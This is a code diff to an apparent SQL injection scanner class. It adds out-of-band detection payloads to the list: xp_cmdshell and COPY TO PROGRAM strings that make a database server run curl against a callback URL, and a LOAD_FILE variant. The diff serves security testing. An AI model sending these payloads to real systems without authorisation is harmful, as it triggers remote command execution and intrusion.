@@ -83,6 +83,11 @@ class SQLInjector(BaseInjector):
             # ── URL-encoded variants ──
             "%27%20OR%201%3D1--",
             "%22%20OR%201%3D1--",
+
+            # ── OOB callbacks (blind detection via DB features) ──
+            f"'; EXEC xp_cmdshell('curl {self._get_oob_url()}/sql/oob1'); --",
+            f"'; COPY (SELECT '') TO PROGRAM 'curl {self._get_oob_url()}/sql/oob2'; --",
+            f"' UNION SELECT LOAD_FILE('{self._get_oob_url()}/sql/oob3')-- -",
         ]
 
     def analyze_response(
